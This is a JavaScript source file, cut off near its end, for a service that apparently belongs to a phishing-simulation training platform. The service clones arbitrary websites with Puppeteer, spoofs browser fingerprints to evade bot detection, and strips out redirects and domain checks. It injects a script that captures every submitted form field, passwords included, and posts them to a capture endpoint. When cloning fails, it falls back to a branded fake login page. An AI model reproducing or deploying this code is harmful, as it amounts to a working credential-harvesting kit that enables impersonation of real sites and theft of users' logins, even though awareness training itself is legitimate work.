const puppeteer = require('puppeteer');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { URL } = require('url');

class UniversalScrapingService {
  constructor() {
    this.baseCloneDir = path.join(process.cwd(), 'public', 'cloned-pages');
    this.baseUrl = process.env.BASE_URL || 'http://localhost:3000';
    this.ensureDirectoryExists();
    
    // Add connection management
    this.maxRetries = 3;
    this.retryDelay = 2000;
    this.requestTimeout = 120000; // 2 minutes max per request
  }

  /**
   * Ensures the base cloning directory exists.
   * @private
   */
  async ensureDirectoryExists() {
    try {
      await fs.access(this.baseCloneDir);
    } catch (error) {
      if (error.code === 'ENOENT') {
        await fs.mkdir(this.baseCloneDir, { recursive: true });
      } else {
        console.error('Error checking or creating base clone directory:', error);
        throw error;
      }
    }
  }

  /**
   * Retry mechanism for failed operations
   * @private
   */
  async retry(operation, maxRetries = this.maxRetries, delay = this.retryDelay) {
    for (let i = 0; i < maxRetries; i++) {
      try {
        return await operation();
      } catch (error) {
        console.warn(`Attempt ${i + 1} failed:`, error.message);
        
        if (i === maxRetries - 1) {
          throw error;
        }
        
        // Exponential backoff
        await this.sleep(delay * Math.pow(2, i));
      }
    }
  }

  /**
   * Extrait le nom du site à partir de l'URL
   * @param {string} url - L'URL du site
   * @returns {string} - Le nom du site
   */
  extractSiteName(url) {
    try {
      const parsedUrl = new URL(url);
      let hostname = parsedUrl.hostname;
      
      // Retire le www. si présent
      hostname = hostname.replace(/^www\./, '');
      
      // Prend le nom principal (ex: google.com -> Google)
      const siteName = hostname.split('.')[0];
      
      // Capitalise la première lettre
      return siteName.charAt(0).toUpperCase() + siteName.slice(1);
    } catch (error) {
      console.warn('Error extracting site name:', error);
      return 'Site';
    }
  }

  /**
   * Génère une page de login générique
   * @param {string} siteName - Le nom du site
   * @param {string} originalUrl - L'URL originale
   * @param {string} campaignId - L'ID de la campagne
   * @returns {string} - Le HTML de la page de login
   */
  generateGenericLoginPage(siteName, originalUrl, campaignId) {
    const parsedUrl = new URL(originalUrl);
    const domain = parsedUrl.hostname;
    const favicon = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
    
    return `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - ${siteName}</title>
    <link rel="icon" href="${favicon}" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            width: 100%;
            max-width: 400px;
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .login-header {
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
        }

        .login-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="25" cy="25" r="1" fill="white" opacity="0.1"/><circle cx="75" cy="75" r="1" fill="white" opacity="0.1"/><circle cx="50" cy="10" r="0.5" fill="white" opacity="0.1"/><circle cx="10" cy="50" r="0.5" fill="white" opacity="0.1"/><circle cx="90" cy="30" r="0.5" fill="white" opacity="0.1"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
            pointer-events: none;
        }

        .site-logo {
            width: 48px;
            height: 48px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            font-size: 24px;
            font-weight: bold;
            position: relative;
            z-index: 1;
        }

        .site-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            position: relative;
            z-index: 1;
        }

        .site-subtitle {
            font-size: 14px;
            opacity: 0.9;
            position: relative;
            z-index: 1;
        }

        .login-form {
            padding: 40px 30px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #374151;
            font-size: 14px;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f9fafb;
        }

        .form-input:focus {
            outline: none;
            border-color: #4f46e5;
            background: white;
            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
        }

        .form-input::placeholder {
            color: #9ca3af;
        }

        .login-button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(79, 70, 229, 0.3);
        }

        .login-button:active {
            transform: translateY(0);
        }

        .login-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }

        .login-button:hover::before {
            left: 100%;
        }

        .form-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            font-size: 14px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .remember-me input[type="checkbox"] {
            width: 16px;
            height: 16px;
            accent-color: #4f46e5;
        }

        .forgot-password {
            color: #4f46e5;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .forgot-password:hover {
            color: #7c3aed;
        }

        .login-footer {
            text-align: center;
            padding: 20px 30px;
            background: #f9fafb;
            border-top: 1px solid #e5e7eb;
            font-size: 14px;
            color: #6b7280;
        }

        .security-notice {
            background: #fef3c7;
            border: 1px solid #f59e0b;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 25px;
            font-size: 13px;
            color: #92400e;
        }

        .security-notice strong {
            color: #78350f;
        }

        @media (max-width: 480px) {
            .login-container {
                margin: 10px;
            }
            
            .login-header {
                padding: 25px 20px;
            }
            
            .login-form {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <div class="site-logo">
                ${siteName.charAt(0)}
            </div>
            <div class="site-title">Connexion à ${siteName}</div>
            <div class="site-subtitle">Accédez à votre compte</div>
        </div>
        
        <div class="login-form">
            <div class="security-notice">
                <strong>Sécurité :</strong> Assurez-vous que l'URL est correcte avant de saisir vos informations.
            </div>
            
            <form id="loginForm" method="POST" action="#">
                <div class="form-group">
                    <label class="form-label" for="email">Email ou nom d'utilisateur</label>
                    <input 
                        type="email" 
                        id="email" 
                        name="email" 
                        class="form-input" 
                        placeholder="votre@email.com"
                        required
                        autocomplete="username"
                    >
                </div>
                
                <div class="form-group">
                    <label class="form-label" for="password">Mot de passe</label>
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        class="form-input" 
                        placeholder="••••••••"
                        required
                        autocomplete="current-password"
                    >
                </div>
                
                <div class="form-options">
                    <label class="remember-me">
                        <input type="checkbox" name="remember" value="1">
                        Se souvenir de moi
                    </label>
                    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
                </div>
                
                <button type="submit" class="login-button">
                    Se connecter
                </button>
            </form>
        </div>
        
        <div class="login-footer">
            Protégé par des mesures de sécurité avancées
        </div>
    </div>

    ${this.generateTrackingScript(campaignId)}
</body>
</html>`;
  }

  /**
   * Vérifie si un site est scrapable
   * @param {object} page - La page Puppeteer
   * @param {string} html - Le contenu HTML
   * @returns {boolean} - True si le site est scrapable
   */
  isSiteScrapable(page, html) {
    // Vérifications pour déterminer si le scraping a réussi
    const checks = [
      html.length > 1000, // Contenu suffisant
      !html.includes('Access Denied'), // Pas de blocage
      !html.includes('Forbidden'), // Pas de 403
      !html.includes('Bot detected'), // Pas de détection de bot
      !html.includes('Cloudflare'), // Pas de protection Cloudflare
      !html.includes('Please enable JavaScript'), // JavaScript requis
      !html.includes('captcha'), // Pas de captcha
      !html.includes('robot'), // Pas de vérification robot
    ];

    const passedChecks = checks.filter(check => check).length;
    const threshold = checks.length * 0.7; // 70% des vérifications doivent passer

    return passedChecks >= threshold;
  }

  /**
   * Clones any website universally with fallback to generic login page.
   * @param {string} url - The URL of the website to clone.
   * @param {string} campaignId - The ID of the campaign.
   * @param {object} options - Optional settings for cloning.
   * @returns {Promise<object>} - An object indicating success, cloned URL, and other details.
   */
  async cloneWebsite(url, campaignId, options = {}) {
    const startTime = Date.now();
    let browser = null;

    try {
      // Validate the URL
      const parsedUrl = new URL(url);
      if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
        throw new Error('Unsupported protocol. Use HTTP or HTTPS.');
      }

      console.log(`🌐 Starting universal cloning for: ${url}`);

      // Create a unique identifier for this clone
      const cloneId = crypto.randomBytes(8).toString('hex');
      const cloneDir = path.join(this.baseCloneDir, `campaign-${campaignId}-${cloneId}`);
      await fs.mkdir(cloneDir, { recursive: true });

      const clonedUrlPath = `cloned-pages/campaign-${campaignId}-${cloneId}/index.html`;
      const clonedUrl = `${this.baseUrl}/${clonedUrlPath}`;
      const previewUrl = clonedUrl;

      // Extract site name for potential fallback
      const siteName = this.extractSiteName(url);

      // Try to scrape with retry mechanism
      const scrapingResult = await this.retry(async () => {
        return await this.attemptScraping(url, parsedUrl, cloneDir, campaignId, options);
      });

      if (scrapingResult.success) {
        console.log('✅ Scraping successful');
        
        // Process scraped HTML
        const processedHtml = await this.processHtmlAdvanced(
          scrapingResult.html, 
          scrapingResult.resources, 
          parsedUrl, 
          campaignId
        );

        // Save the main HTML file
        const indexPath = path.join(cloneDir, 'index.html');
        await fs.writeFile(indexPath, processedHtml, 'utf8');

        const totalTime = Date.now() - startTime;
        console.log(`🎯 Cloning completed in ${totalTime}ms`);

        return {
          success: true,
          clonedUrl,
          previewUrl,
          filePath: `cloned-pages/campaign-${campaignId}-${cloneId}`,
          cloneId,
          originalUrl: url,
          siteName,
          isGeneric: false,
          resourcesCount: scrapingResult.resources.size,
          htmlSize: processedHtml.length,
          processingTime: totalTime,
          message: `Website cloned successfully (${siteName})`
        };
      } else {
        // Fallback to generic login page
        console.log(`🔄 Scraping failed, generating generic login page for ${siteName}`);
        const html = this.generateGenericLoginPage(siteName, url, campaignId);
        
        // Save the generic login page
        const indexPath = path.join(cloneDir, 'index.html');
        await fs.writeFile(indexPath, html, 'utf8');

        const totalTime = Date.now() - startTime;

        return {
          success: true,
          clonedUrl,
          previewUrl,
          filePath: `cloned-pages/campaign-${campaignId}-${cloneId}`,
          cloneId,
          originalUrl: url,
          siteName,
          isGeneric: true,
          resourcesCount: 0,
          htmlSize: html.length,
          processingTime: totalTime,
          message: `Generic login page generated for ${siteName} (scraping failed)`
        };
      }

    } catch (error) {
      console.error('❌ Error during cloning:', error);

      // Critical error fallback
      try {
        const siteName = this.extractSiteName(url);
        const cloneId = crypto.randomBytes(8).toString('hex');
        const cloneDir = path.join(this.baseCloneDir, `campaign-${campaignId}-${cloneId}`);
        await fs.mkdir(cloneDir, { recursive: true });

        const html = this.generateGenericLoginPage(siteName, url, campaignId);
        const indexPath = path.join(cloneDir, 'index.html');
        await fs.writeFile(indexPath, html, 'utf8');

        const clonedUrlPath = `cloned-pages/campaign-${campaignId}-${cloneId}/index.html`;
        const clonedUrl = `${this.baseUrl}/${clonedUrlPath}`;

        const totalTime = Date.now() - startTime;

        return {
          success: true,
          clonedUrl,
          previewUrl: clonedUrl,
          filePath: `cloned-pages/campaign-${campaignId}-${cloneId}`,
          cloneId,
          originalUrl: url,
          siteName,
          isGeneric: true,
          resourcesCount: 0,
          htmlSize: html.length,
          processingTime: totalTime,
          message: `Generic login page generated for ${siteName} (fallback after error)`
        };

      } catch (fallbackError) {
        console.error('❌ Fallback also failed:', fallbackError);
        return {
          success: false,
          message: 'Error cloning website and generating fallback',
          error: error.message
        };
      }
    } finally {
      if (browser) {
        try {
          await browser.close();
        } catch (closeError) {
          console.warn('Warning: Error closing browser:', closeError);
        }
      }
    }
  }

  /**
   * Attempts to scrape the website
   * @private
   */
  async attemptScraping(url, parsedUrl, cloneDir, campaignId, options) {
    let browser = null;
    let page = null;
    
    try {
      // Optimized Puppeteer configuration
      browser = await puppeteer.launch({
        headless: options.headless !== false ? 'new' : false,
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-accelerated-2d-canvas',
          '--no-first-run',
          '--no-zygote',
          '--disable-gpu',
          '--disable-web-security',
          '--disable-features=VizDisplayCompositor',
          '--disable-background-timer-throttling',
          '--disable-backgrounding-occluded-windows',
          '--disable-renderer-backgrounding',
          '--disable-blink-features=AutomationControlled',
          '--disable-extensions',
          '--disable-plugins',
          '--disable-default-apps',
          '--disable-sync',
          '--disable-translate',
          '--hide-scrollbars',
          '--mute-audio',
          '--no-default-browser-check',
          '--no-experiments',
          '--disable-ipc-flooding-protection',
          '--max-old-space-size=4096' // Increase memory limit
        ],
        timeout: 30000, // Reduced timeout for browser launch
        defaultViewport: null
      });

      page = await browser.newPage();

      // Set a more reasonable timeout for page operations
      page.setDefaultTimeout(this.requestTimeout);

      // Configure realistic headers
      await page.setUserAgent(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
      );

      await page.setExtraHTTPHeaders({
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0'
      });

      // Realistic viewport
      await page.setViewport({
        width: 1920,
        height: 1080,
        deviceScaleFactor: 1,
        hasTouch: false,
        isLandscape: true,
        isMobile: false
      });

      // Remove bot indicators
      await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', {
          get: () => undefined,
        });

        delete window.navigator.webdriver;

        Object.defineProperty(navigator, 'plugins', {
          get: () => [1, 2, 3, 4, 5],
        });

        Object.defineProperty(navigator, 'languages', {
          get: () => ['fr-FR', 'fr', 'en'],
        });

        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
          parameters.name === 'notifications' ?
            Promise.resolve({ state: 'denied' }) :
            originalQuery(parameters)
        );
      });

      // Resource management with timeout
      const resources = new Map();
      const resourcePromises = [];
      const downloadedUrls = new Set();

      await page.setRequestInterception(true);

      page.on('request', async (request) => {
        const resourceType = request.resourceType();
        
        if (['document', 'stylesheet', 'script', 'font', 'image'].includes(resourceType)) {
          request.continue();
        } else if (['xhr', 'fetch', 'websocket', 'manifest'].includes(resourceType)) {
          request.abort();
        } else {
          request.continue();
        }
      });

      page.on('response', async (response) => {
        const responseUrl = response.url();
        const resourceType = response.request().resourceType();
        const status = response.status();

        if (['stylesheet', 'script', 'font', 'image'].includes(resourceType) &&
            status >= 200 && status < 400 &&
            !downloadedUrls.has(responseUrl)) {

          downloadedUrls.add(responseUrl);

          const downloadPromise = Promise.race([
            this.downloadResource(response, responseUrl, cloneDir, parsedUrl.origin),
            new Promise((_, reject) => 
              setTimeout(() => reject(new Error('Resource download timeout')), 30000)
            )
          ]).then(localPath => {
            if (localPath) {
              resources.set(responseUrl, localPath);
            }
          }).catch(error => {
            console.warn(`Failed to download resource: ${responseUrl}`, error.message);
          });

          resourcePromises.push(downloadPromise);
        }
      });

      // Navigate to the page with timeout
      console.log(`📡 Navigating to: ${url}`);

      let navigationTimeout = 45000; // 45 seconds
      try {
        await Promise.race([
          page.goto(url, {
            waitUntil: 'domcontentloaded',
            timeout: navigationTimeout
          }),
          new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Navigation timeout')), navigationTimeout)
          )
        ]);
      } catch (gotoError) {
        console.warn('⚠️ Navigation timeout, trying with minimal wait');
        await page.goto(url, {
          waitUntil: 'domcontentloaded',
          timeout: 20000
        });
      }

      // Wait for resources to load with timeout
      await Promise.race([
        this.sleep(3000),
        new Promise((resolve) => setTimeout(resolve, 5000))
      ]);

      // Optimize page content
      await page.evaluate(() => {
        // Load lazy images
        const lazyImages = document.querySelectorAll('img[data-src], img[data-lazy-src]');
        lazyImages.forEach(img => {
          if (img.dataset.src) img.src = img.dataset.src;
          if (img.dataset.lazySrc) img.src = img.dataset.lazySrc;
        });

        // Scroll to trigger lazy loading
        window.scrollTo(0, document.body.scrollHeight);
        window.scrollTo(0, 0);

        // Remove annoying overlays
        const overlays = document.querySelectorAll('[class*="overlay"], [class*="modal"], [class*="popup"]');
        overlays.forEach(overlay => {
          if (overlay.style.position === 'fixed' || overlay.style.position === 'absolute') {
            overlay.remove();
          }
        });
      });

      // Final wait
      await this.sleep(2000);

      // Wait for resources with timeout
      console.log(`⏳ Downloading ${resourcePromises.length} resources...`);
      await Promise.race([
        Promise.allSettled(resourcePromises),
        new Promise((resolve) => setTimeout(resolve, 60000)) // 1 minute max for resources
      ]);

      // Get the complete HTML
      const html = await page.content();

      // Check if scraping was successful
      const scrapingSuccess = this.isSiteScrapable(page, html);

      console.log(`📊 Scraping success: ${scrapingSuccess}`);
      console.log(`✅ HTML captured: ${html.length} characters`);
      console.log(`📦 Downloaded resources: ${resources.size}`);

      await browser.close();

      return {
        success: scrapingSuccess,
        html,
        resources
      };

    } catch (error) {
      if (browser) {
        await browser.close();
      }
      throw error;
    }
  }

  /**
   * Downloads a resource in an optimized manner.
   * @param {object} response - Puppeteer Response object.
   * @param {string} responseUrl - The URL of the resource.
   * @param {string} cloneDir - The directory where the clone is stored.
   * @param {string} baseOrigin - The origin of the base URL.
   * @returns {Promise<string|null>} - The local path of the downloaded resource or null on failure.
   */
  async downloadResource(response, responseUrl, cloneDir, baseOrigin) {
    try {
      const buffer = await response.buffer();
      const resourcePath = this.getResourcePath(responseUrl, baseOrigin);
      const fullResourcePath = path.join(cloneDir, resourcePath);

      await fs.mkdir(path.dirname(fullResourcePath), { recursive: true });

      if (resourcePath.endsWith('.css')) {
        let cssContent = buffer.toString('utf8');
        cssContent = this.processCssUrls(cssContent, responseUrl, baseOrigin);
        await fs.writeFile(fullResourcePath, cssContent, 'utf8');
      } else {
        await fs.writeFile(fullResourcePath, buffer);
      }

      return resourcePath;
    } catch (error) {
      console.warn(`Error downloading resource ${responseUrl}:`, error.message);
      return null;
    }
  }

  /**
   * Processes URLs within CSS files.
   * @param {string} cssContent - The CSS content.
   * @param {string} cssUrl - The URL of the CSS file.
   * @param {string} baseOrigin - The origin of the base URL.
   * @returns {string} - The CSS content with corrected URLs.
   */
  processCssUrls(cssContent, cssUrl, baseOrigin) {
    cssContent = cssContent.replace(/url\(['"]?([^'")\s]+)['"]?\)/g, (match, url) => {
      try {
        if (url.startsWith('data:') || url.startsWith('http')) {
          return match;
        }

        const absoluteUrl = new URL(url, cssUrl).href;
        return `url('${absoluteUrl}')`;
      } catch (error) {
        console.warn(`Failed to resolve CSS URL "${url}" in "${cssUrl}":`, error.message);
        return match;
      }
    });

    return cssContent;
  }

  /**
   * Advanced HTML processing.
   * @param {string} html - The raw HTML content.
   * @param {Map<string, string>} resources - Map of original resource URLs to local paths.
   * @param {URL} originalUrl - The parsed original URL.
   * @param {string} campaignId - The campaign ID.
   * @returns {Promise<string>} - The processed HTML content.
   */
  async processHtmlAdvanced(html, resources, originalUrl, campaignId) {
    console.log('🔧 Advanced HTML processing...');

    // Replace resource URLs with local versions
    for (const [originalResource, localPath] of resources) {
      const escapedOriginal = originalResource.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const regex = new RegExp(escapedOriginal, 'g');
      html = html.replace(regex, localPath);
    }

    // Fix relative URLs
    html = this.fixRelativeUrls(html, originalUrl);

    // Neutralize problematic scripts
    html = this.neutralizeProblematicScripts(html);

    // Add the tracking script
    const trackingScript = this.generateTrackingScript(campaignId);
    if (html.includes('</body>')) {
      html = html.replace('</body>', trackingScript + '\n</body>');
    } else {
      html += trackingScript;
    }

    // Optimize HTML for simulation
    html = this.optimizeForSimulation(html, originalUrl);

    return html;
  }

  /**
   * Corrects relative URLs in HTML attributes.
   * @param {string} html - The HTML content.
   * @param {URL} originalUrl - The parsed original URL.
   * @returns {string} - The HTML content with fixed URLs.
   */
  fixRelativeUrls(html, originalUrl) {
    // Correct href links
    html = html.replace(/href=["']([^"']+)["']/g, (match, url) => {
      try {
        if (url.startsWith('http') || url.startsWith('mailto:') || url.startsWith('tel:') || url.startsWith('#')) {
          return match;
        }

        const absoluteUrl = new URL(url, originalUrl).href;
        return `href="${absoluteUrl}"`;
      } catch (error) {
        console.warn(`Failed to resolve href URL "${url}":`, error.message);
        return match;
      }
    });

    // Correct src sources
    html = html.replace(/src=["']([^"']+)["']/g, (match, url) => {
      try {
        if (url.startsWith('http') || url.startsWith('data:') || url.startsWith('//')) {
          return match;
        }

        const absoluteUrl = new URL(url, originalUrl).href;
        return `src="${absoluteUrl}"`;
      } catch (error) {
        console.warn(`Failed to resolve src URL "${url}":`, error.message);
        return match;
      }
    });

    // Correct form actions
    html = html.replace(/action=["']([^"']+)["']/g, (match, url) => {
      try {
        if (url.startsWith('http') || url === '#' || url === '') {
          return match;
        }

        const absoluteUrl = new URL(url, originalUrl).href;
        return `action="${absoluteUrl}"`;
      } catch (error) {
        console.warn(`Failed to resolve action URL "${url}":`, error.message);
        return match;
      }
      });

    return html;
  }

  /**
   * Neutralizes problematic scripts that might break the cloned site.
   * @param {string} html - The HTML content.
   * @returns {string} - The HTML content with neutralized scripts.
   */
  neutralizeProblematicScripts(html) {
    // Disable automatic redirection scripts
    html = html.replace(/window\.location\s*=\s*['"][^'"]*['"]/g, '// window.location disabled');
    html = html.replace(/location\.href\s*=\s*['"][^'"]*['"]/g, '// location.href disabled');
    html = html.replace(/location\.replace\([^)]*\)/g, '// location.replace disabled');

    // Disable redirection timers
    html = html.replace(/setTimeout\s*\(\s*function\s*\(\s*\)\s*\{[^}]*location[^}]*\}/g, '// setTimeout redirect disabled');

    // Disable domain checks
    html = html.replace(/if\s*\(\s*window\.location\.hostname[^}]*\}/g, '// hostname check disabled');

    return html;
  }

  /**
   * Optimizes HTML for simulation purposes.
   * @param {string} html - The HTML content.
   * @param {URL} originalUrl - The parsed original URL.
   * @returns {string} - The optimized HTML content.
   */
  optimizeForSimulation(html, originalUrl) {
    // Disable all external links and add custom alert
    html = html.replace(/(<a[^>]*href=["'])([^"']*)(["'][^>]*>)/g, (match, before, url, after) =>
    {
      try {
        const urlObj = new URL(url, originalUrl);
        if (urlObj.origin !== originalUrl.origin) {
          // Corrected syntax for template literal and onclick attribute
          return `${before}#${after.replace('>', ` onclick="window.customAlert('External link disabled for simulation'); return false;">`)}`;
        }
        return match;
      } catch (error) {
        console.warn(`Error processing link "${url}" for simulation:`, error.message);
        // Corrected syntax for template literal and onclick attribute
        return `${before}#${after.replace('>', ` onclick="window.customAlert('Link disabled for simulation'); return false;">`)}`;
      }
    });

    // Prevent new windows from opening
    html = html.replace(/target=["']_blank["']/g, 'target="_self"');
    html = html.replace(/window\.open\(/g, '// window.open disabled (');

    return html;
  }

  /**
   * Generates the tracking script to be injected into the cloned page.
   * @param {string} campaignId - The ID of the campaign.
   * @returns {string} - The tracking script as a string.
   */
  generateTrackingScript(campaignId) {
    return `
    <script>
      (function() {
        // Custom alert function to replace native alert()
        window.customAlert = function(message) {
          console.log('Custom Alert:', message);
          // You can implement a more sophisticated modal/message box here if needed.
          // For now, it just logs to console.
          // Example: alert(message); // If you still want the native alert for simulation
        };

        console.log('🎯 PhishWise Universal Tracking activated');

        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', initTracking);
        } else {
          initTracking();
        }

        function initTracking() {
          // Intercept all forms
          const forms = document.querySelectorAll('form');
          console.log('📝 Forms detected:', forms.length);

          forms.forEach(function(form, index) {
            form.addEventListener('submit', function(e) {
              e.preventDefault();
              console.log('📋 Form submission intercepted:', index);

              // Collect all form data
              const formData = new FormData(form);
              const data = {};

              // Extract data from inputs
              for (let [key, value] of formData.entries()) {
                data[key] = value;
              }

              // Add inputs not included in FormData (e.g., unchecked checkboxes, disabled inputs)
              const inputs = form.querySelectorAll('input, select, textarea');
              inputs.forEach(function(input) {
                if (input.name && typeof data[input.name] === 'undefined') { // Only add if not already in formData
                  if (input.type === 'checkbox' || input.type === 'radio') {
                    data[input.name] = input.checked ? input.value : ''; // Capture checked state
                  } else {
                    data[input.name] = input.value;
                  }
                }
              });

              // Tracking metadata
              data._campaignId = '${campaignId}';
              data._timestamp = new Date().toISOString();
              data._userAgent = navigator.userAgent;
              data._referrer = document.referrer;
              data._url = window.location.href;
              data._formIndex = index;
              data._formAction = form.action || 'N/A';
              data._formMethod = form.method || 'GET';

              console.log('📊 Collected data:', data);

              // Send data
              fetch('${this.baseUrl}/api/phishing/capture', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
              }).then(function(response) {
                console.log('✅ Data sent successfully');
                // Redirect to learning page
                window.location.href = '${this.baseUrl}/learning/${campaignId}';
              }).catch(function(error) {
                console.error('❌ Error sending data:', error);
                // Redirect even on error
                setTimeout(function() {
                  window.location.href = '${this.baseUrl}/learning/${campaignId}';
                }, 1000);
              });
            });
          });

          // Track link clicks
          document.addEventListener('click', function(e) {
            const link = e.target.closest('a');
            if (link) {
              const href = link.href;
              console.log('🔗 Link clicked:', href);

              // Send click event
              fetch('${this.baseUrl}/api/phishing/track-click', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  campaignId: '${campaignId}',
                  clickedUrl: href,
                  linkText: link.textContent.trim(),
                  timestamp: new Date().toISOString(),
                  userAgent: navigator.userAgent
                })
              }).catch(console.error);
            }
          });

          // Track input field interactions (focus)
          const inputs = document.querySelectorAll('input, textarea, select');
          inputs.forEach(function(input) {
            input.addEventListener('focus', function() {
              console.log('🎯 Focus on:', input.name || input.type || input.id || 'unknown field');
            });
          });

          console.log('🚀 Universal tracking initialized');
        }
      })();
    </script>`;
  }

  /**
   * Generates the local path for a resource.
   * @param {string} resourceUrl - The URL of the resource.
   * @param {string} baseOrigin - The origin of the base URL.
   * @returns {string} - The generated local path.
   */
  getResourcePath(resourceUrl, baseOrigin) {
    try {
      const url = new URL(resourceUrl);
      let relativePath = url.pathname;

      // Clean the path (remove leading slashes)
      relativePath = relativePath.replace(/^\/+/, '');

      // If path is empty or just '/', generate a unique name
      if (!relativePath || relativePath === '/') {
        const hash = crypto.createHash('md5').update(resourceUrl).digest('hex').substring(0, 8);
        relativePath = `resource_${hash}`;
      }

      // Add an extension if necessary
      if (!path.extname(relativePath)) {
        const contentType = this.guessContentType(resourceUrl);
        relativePath += this.getExtensionFromContentType(contentType);
      }

      // Ensure the path is safe for file system (e.g., replace invalid characters)
      relativePath = relativePath.replace(/[^a-zA-Z0-9\-\._~:\/\?#\[\]@!\$&'\(\)\*\+,;=]/g, '_');

      return `assets/${relativePath}`;
    } catch (error) {
      console.warn(`Error generating resource path for ${resourceUrl}:`, error.message);
      const hash = crypto.createHash('md5').update(resourceUrl).digest('hex').substring(0, 8);
      return `assets/resource_${hash}`; // Fallback to a hashed name
    }
  }

  /**
   * Guesses the content type based on the URL's extension.
   * @param {string} url - The URL of the resource.
   * @returns {string} - The guessed MIME type.
   */
  guessContentType(url) {
    const ext = path.extname(new URL(url).pathname).toLowerCase();
    const contentTypes = {
      '.css': 'text/css',
      '.js': 'application/javascript',
      '.png': 'image/png',
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.gif': 'image/gif',
      '.svg': 'image/svg+xml',
      '.woff': 'font/woff',
      '.woff2': 'font/woff2',
      '.ttf': 'font/ttf',
      '.otf': 'font/otf',
      '.ico': 'image/x-icon',
      '.webp': 'image/webp'
    };

    return contentTypes[ext] || 'application/octet-stream';
  }

  /**
   * Gets the file extension based on the content type.
   * @param {string} contentType - The MIME type.
   * @returns {string} - The file extension.
   */
  getExtensionFromContentType(contentType) {
    const extensions = {
      'text/css': '.css',
      'application/javascript': '.js',
      'text/javascript': '.js', // Common alias for application/javascript
      'image/png': '.png',
      'image/jpeg': '.jpg',
      'image/gif': '.gif',
      'image/svg+xml': '.svg',
      'font/woff': '.woff',
      'font/woff2': '.woff2',
      'font/ttf': '.ttf',
      'font/otf': '.otf',
      'image/x-icon': '.ico',
      'image/webp': '.webp'
    };

    return extensions[contentType] || '';
  }

  /**
   * Sleep function for delaying execution.
   * @param {number} ms - The number of milliseconds to sleep.
   * @returns {Promise<void>}
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Cleans up files associated with a specific campaign.
   * @param {string} campaignId - The ID of the campaign to clean up.
   * @returns {Promise<object>} - An object indicating success and deleted file count.
   */
  async cleanupCampaignFiles(campaignId) {
    try {
      const files = await fs.readdir(this.baseCloneDir);
